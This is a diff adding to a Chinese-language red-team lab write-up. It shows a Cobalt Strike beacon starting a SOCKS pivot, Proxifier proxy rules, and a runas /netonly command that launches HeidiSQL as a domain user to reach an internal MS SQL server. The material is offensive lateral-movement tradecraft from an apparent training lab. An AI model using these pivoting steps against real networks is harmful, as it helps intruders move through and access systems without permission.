@@ -126,3 +126,62 @@ proxychains python3 /usr/local/bin/mssqlclient.py -windows-auth DEV/bfarmer@10.1
 **方法3**
 
 这里需要用Proxifier做一个代理才能访问到10.10.17.25
+
+
+1. 子网主机里开启一个pivot
+```
+beacon> socks 1080
+[+] started SOCKS4a server on: 1080
+[+] host called home, sent: 16 bytes
+beacon> run hostname
+[*] Tasked beacon to run: hostname
+[+] host called home, sent: 26 bytes
+[+] received output:
+wkstn-1
+
+beacon> shell ipconfig
+[*] Tasked beacon to run: ipconfig
+[+] host called home, sent: 39 bytes
+[+] received output:
+
+Windows IP Configuration
+
+
+Ethernet adapter Ethernet:
+
+   Connection-specific DNS Suffix  . : 
+   IPv4 Address. . . . . . . . . . . : 10.10.17.231
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 10.10.17.1
+
+Tunnel adapter isatap.{90869922-2FCF-4D43-859E-B22588A4FFEF}:
+
+   Media State . . . . . . . . . . . : Media disconnected
+   Connection-specific DNS Suffix  . : 
+
+```
+
+2. 创建一个proxyserver
+
+1660832489408.png
+
+3. 创建一个Proxification Rules
+
+1660832683125.png
+
+
+4. 注意，这里需要用bfmarer的身份开启heidisql.exe，这样后面的windows auth登录才能成功
+```
+runas /netonly /user:DEV\bfarmer c:\Tools\Heidisql\heidisql.exe
+```
+
+1660869054791.png
+
+
+5. 成功连接数据库，执行查询
+
+1660869206564.png
+
+
+# MS SQL NetNTLM Capture
+
